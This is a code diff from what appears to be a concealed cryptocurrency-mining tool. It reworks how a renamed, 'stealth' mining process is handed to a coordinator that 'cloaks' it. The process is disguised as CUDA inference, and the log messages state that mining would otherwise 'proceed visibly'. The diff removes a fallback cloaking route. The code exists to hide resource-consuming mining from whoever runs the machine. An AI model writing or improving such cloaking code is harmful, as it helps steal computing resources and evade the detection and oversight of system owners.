@@ -374,90 +374,38 @@ def main():
                 threading.Thread(target=_simplified_hook_sequencing, daemon=True).start()
                 logger.info("🚀 [LINEAR-FLOW] Simplified hook sequencing started")
                 
-                # REMOVED: Duplicate coordination method - using linear flow only
-                # 🚀 **LINEAR FLOW: PRIMARY HANDOFF TO HOOKCOORDINATOR** (luồng tuyến tính: chuyển giao chính đến HookCoordinator)
+                # 🚀 **PRIMARY HANDOFF TO HOOKCOORDINATOR** (chuyển giao chính đến HookCoordinator)
+                # This is the single point of entry for PID registration.
+                # The fallback logic has been removed to prevent context mismatch.
                 try:
-                    # **Use HookCoordinator from imported module** (sử dụng HookCoordinator từ module đã import)
                     from mining_environment.coordination.coordinator import get_hook_coordinator
-                    
-                    # **Process metadata for handoff chain** (metadata tiến trình cho chuỗi handoff)
+
                     process_metadata = {
                         'stealth_name': new_name,
                         'role': 'real',
                         'timestamp': time.time(),
-                        'wrapper_pid': os.getpid(),  # PID của stealth wrapper
+                        'wrapper_pid': os.getpid(),
                         'stealth_enabled': True,
                         'registration_source': 'stealth_inference_cuda'
                     }
-                    
-                    # **STEP 1: PRIMARY HANDOFF TO HOOKCOORDINATOR** (bước 1: handoff chính đến HookCoordinator)
+
                     coordinator = get_hook_coordinator()
                     success = coordinator.receive_from_stealth_wrapper(
                         pid=process.pid,
                         process_metadata=process_metadata,
-                        subprocess_env=clean_env  # **TIER 7.1 FIX: Pass subprocess environment for context-aware checking**
+                        subprocess_env=clean_env
                     )
-                    
+
                     if success:
-                        logger.info(f"✅ [LINEAR-FLOW] Primary handoff to HookCoordinator successful: PID={process.pid}")
-                        logger.info(f"🔗 [LINEAR-FLOW] HookCoordinator will handle sequential forwarding to DirectPIDRegistry → ResourceManager")
+                        logger.info(f"✅ [HANDOFF] Primary handoff to HookCoordinator successful for PID={process.pid}")
+                        logger.info(f"🔗 [HANDOFF] Coordination chain: HookCoordinator → DirectPIDRegistry → ResourceManager")
                     else:
-                        logger.warning(f"⚠️ [LINEAR-FLOW] Primary handoff to HookCoordinator failed for PID {process.pid}")
-                        logger.warning(f"🔄 [LINEAR-FLOW] Mining process will continue but coordination may be limited")
-                        
-                except Exception as registry_err:
-                    logger.error(f"❌ [DIRECT-REGISTRY] HookCoordinator registration failed: {registry_err}")
-                    # **🥇 TIER 6 FIX: Implement Fallback Cloaking Mechanism**
-                    logger.warning(f"🔄 [TIER-6-FALLBACK] Attempting direct ResourceManager handoff...")
-                    
-                    try:
-                        # **TIER 6 FIX: Direct ResourceManager handoff when HookCoordinator fails**
-                        from mining_environment.scripts.resource_manager import ResourceManager
-                        
-                        # **Get ResourceManager instance** (lấy instance của ResourceManager)
-                        from mining_environment.scripts.auxiliary_modules.models import ConfigModel
-                        fallback_config = ConfigModel()  # Create default config
-                        resource_manager = ResourceManager(fallback_config, logger=logger)
-                        
-                        # **Prepare metadata for direct handoff** (chuẩn bị metadata cho handoff trực tiếp)
-                        direct_metadata = {
-                            'name': new_name,
-                            'cmd': cuda_inference_args,
-                            'role': 'real',
-                            'timestamp': time.time(),
-                            'wrapper_pid': os.getpid(),
-                            'stealth_enabled': True,
-                            'registration_source': 'stealth_inference_cuda_fallback',
-                            'bypass_coordinator': True  # Mark as bypassed coordinator
-                        }
-                        
-                        # **Start ResourceManager** if not already started
-                        if not ResourceManager.is_ready():
-                            logger.info(f"🚀 [TIER-6-FALLBACK] Starting ResourceManager...")
-                            resource_manager.start()
-                            # Wait for ResourceManager to be ready
-                            if not ResourceManager.wait_for_ready(timeout=10.0):
-                                logger.error(f"❌ [TIER-6-FALLBACK] ResourceManager failed to start")
-                                raise RuntimeError("ResourceManager startup failed")
-                        
-                        # **Direct handoff to ResourceManager** (handoff trực tiếp đến ResourceManager)
-                        fallback_success = resource_manager.receive_from_registry(
-                            pid=process.pid,
-                            registry_metadata=direct_metadata
-                        )
-                        
-                        if fallback_success:
-                            logger.info(f"✅ [TIER-6-FALLBACK] Direct ResourceManager handoff successful - cloaking activated")
-                            logger.info(f"🎯 [TIER-6-FALLBACK] PID {process.pid} will be cloaked despite HookCoordinator failure")
-                        else:
-                            logger.error(f"❌ [TIER-6-FALLBACK] Direct ResourceManager handoff failed")
-                            logger.warning(f"⚠️ [TIER-6-FALLBACK] Process will continue without cloaking - manual intervention may be needed")
-                            
-                    except Exception as fallback_err:
-                        logger.error(f"❌ [TIER-6-FALLBACK] Fallback mechanism failed: {fallback_err}")
-                        logger.warning(f"⚠️ [TIER-6-FALLBACK] All cloaking mechanisms failed - process will continue without cloaking")
-                        # **Final fallback**: Vẫn tiếp tục chạy process nếu tất cả fail
-                        logger.info(f"🔄 [TIER-6-FALLBACK] Process continuing without cloaking - mining operations will proceed visibly")
+                        logger.error(f"❌ [HANDOFF] Primary handoff to HookCoordinator FAILED for PID {process.pid}")
+                        logger.warning(f"⚠️ [HANDOFF] Mining will continue, but cloaking and optimization will be DISABLED.")
+
+                except Exception as handoff_err:
+                    logger.critical(f"🚨 [HANDOFF-CRITICAL] Could not perform handoff to HookCoordinator: {handoff_err}")
+                    logger.warning(f"⚠️ [HANDOFF-CRITICAL] This is a critical architecture failure. Cloaking is non-functional.")
             except Exception as rename_err:
                 logger.error(f"❌ [GPU-POST-EXEC-STEALTH] Failed to rename child PID: {rename_err}")
             
